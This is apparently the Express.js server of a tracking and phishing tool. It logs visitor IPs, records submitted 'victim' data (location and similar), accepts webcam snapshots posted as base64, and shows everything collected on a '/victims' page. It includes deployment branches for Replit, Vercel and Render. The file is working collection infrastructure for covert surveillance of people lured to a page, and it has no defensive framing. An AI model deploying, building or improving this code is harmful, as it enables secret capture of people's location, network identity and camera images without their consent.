const fs = require("fs");
const express = require("express");
var bodyParser = require('body-parser');
const base64ToImage = require('base64-to-image');
const config=require('./app').config;

// Check if running in deployment or read-only environment
const isDeployment = process.env.REPLIT_DEPLOYMENT === '1' || process.env.VERCEL === '1' || process.env.RENDER === '1';
let objectStorageClient;

// In-memory storage for non-Replit deployments
let memoryStorage = {
  logs: '',
  victimsData: '',
  images: new Map()
};

if (isDeployment) {
  try {
    // Only try to use Replit Object Storage on Replit
    if (process.env.REPLIT_DEPLOYMENT === '1') {
      const { Client } = require('@replit/object-storage');
      objectStorageClient = new Client();
      console.log('Object Storage initialized for Replit deployment');
    } else {
      console.log('Using memory storage for non-Replit deployment');
    }
  } catch (err) {
    console.log('Object Storage not available, using memory storage');
  }
}

var jsonParser=bodyParser.json({limit:1024*1024*20, type:'application/json'});
var urlencodedParser=bodyParser.urlencoded({ extended:true,limit:1024*1024*20,type:'application/x-www-form-urlencoded' });
const app = express();
app.use(jsonParser);
app.use(urlencodedParser);
app.use(express.static("public"));
app.set("view engine", "ejs");
app.get("/", (req, res) => {
var ip;
var d = new Date();
d=d.toJSON().slice(0,19).replace('T',':');
if (req.headers['x-forwarded-for']) {ip = req.headers['x-forwarded-for'].split(",")[0];} else if (req.connection && req.connection.remoteAddress) {ip = req.connection.remoteAddress;} else {ip = req.ip;}
res.render("index",{ip:ip,time:d,redirect:config.redirectURL,camera:config.camera,cams:config.camsnaps,location:config.location});

if (isDeployment && objectStorageClient) {
  // Use Object Storage for Replit deployment
  objectStorageClient.downloadAsText('log.txt').then(existingLog => {
    const newLog = (existingLog || '') + "Visit Form: "+ip+" | At:"+d+"\n\n";
    return objectStorageClient.uploadFromText('log.txt', newLog);
  }).catch(err => {
    // File doesn't exist, create new
    objectStorageClient.uploadFromText('log.txt', "Visit Form: "+ip+" | At:"+d+"\n\n");
  });
} else if (isDeployment) {
  // Use memory storage for non-Replit deployments (Vercel/Render)
  memoryStorage.logs += "Visit Form: "+ip+" | At:"+d+"\n\n";
} else {
  // Use local file system for development
  try {
    fs.appendFile('./views/log.txt',"Visit Form: "+ip+" | At:"+d+"\n\n", function (err) {
      if (err) console.log('Log write error:', err.message);
    });
  } catch (err) {
    console.log('File system not writable, skipping log');
  }
}
});
app.get("/victims",(req,res)=>{
  if (isDeployment && objectStorageClient) {
    // Load victims data from Object Storage (Replit)
    objectStorageClient.downloadAsText('victims-data.txt').then(victimsData => {
      res.render("victims", {victimsData: victimsData || ''});
    }).catch(err => {
      res.render("victims", {victimsData: ''});
    });
  } else if (isDeployment) {
    // Use memory storage for non-Replit deployments
    res.render("victims", {victimsData: memoryStorage.victimsData || ''});
  } else {
    res.render("victims", {victimsData: ''});
  }
});
app.post("/",(req,res)=>{
if (isDeployment && objectStorageClient) {
  // Use Object Storage for Replit deployment
  objectStorageClient.downloadAsText('victims-data.txt').then(existingData => {
    const newData = (existingData || '') + decodeURIComponent(req.body.data)+"\n\n";
    return objectStorageClient.uploadFromText('victims-data.txt', newData);
  }).then(() => {
    console.log('Saved!');
    res.send("Done");
  }).catch(err => {
    // File doesn't exist, create new
    objectStorageClient.uploadFromText('victims-data.txt', decodeURIComponent(req.body.data)+"\n\n").then(() => {
      console.log('Saved!');
      res.send("Done");
    }).catch(saveErr => {
      console.log('Save error:', saveErr.message);
      res.send("Error saving data");
    });
  });
} else if (isDeployment) {
  // Use memory storage for non-Replit deployments
  memoryStorage.victimsData += decodeURIComponent(req.body.data)+"\n\n";
  console.log('Saved to memory!');
  res.send("Done");
} else {
  // Use local file system for development
  try {
    fs.appendFile('./views/victims.ejs', decodeURIComponent(req.body.data)+"\n\n", function (err) {
      if (err) {
        console.log('File write error:', err.message);
        res.send("Error saving data");
      } else {
        console.log('Saved!');
        res.send("Done");
      }
    });
  } catch (err) {
    console.log('File system not writable:', err.message);
    res.send("Done"); // Continue gracefully
  }
}
});
app.post("/camsnap",(req,res)=>{
if (isDeployment && objectStorageClient) {
  // Store images in Object Storage for Replit deployment
  try {
    const fileName = `img-${Date.now()}.png`;
    const base64Data = decodeURIComponent(req.body.img).replace(/^data:image\/png;base64,/, '');
    const buffer = Buffer.from(base64Data, 'base64');
    
    objectStorageClient.uploadFromBuffer(`images/${fileName}`, buffer).then(() => {
      res.send(fileName);
    }).catch(err => {
      console.log('Image upload error:', err.message);
      res.send('upload-error');
    });
  } catch (err) {
    console.log('Image processing error:', err.message);
    res.send('processing-error');
  }
} else if (isDeployment) {
  // Store images in memory for non-Replit deployments
  try {
    const fileName = `img-${Date.now()}.png`;
    const base64Data = decodeURIComponent(req.body.img).replace(/^data:image\/png;base64,/, '');
    memoryStorage.images.set(fileName, base64Data);
    res.send(fileName);
  } catch (err) {
    console.log('Image processing error:', err.message);
    res.send('processing-error');
  }
} else {
  // Use local storage for development
  try {
    const path = './public/images/';
    const { imageType, fileName } = base64ToImage( decodeURIComponent(req.body.img), path,{ type: 'png' });
    res.send(fileName);
  } catch (err) {
    console.log('Local image save error:', err.message);
    res.send('local-error');
  }
}
});
app.listen(5000, () => {
console.log("App Running on Port 5000!");
});
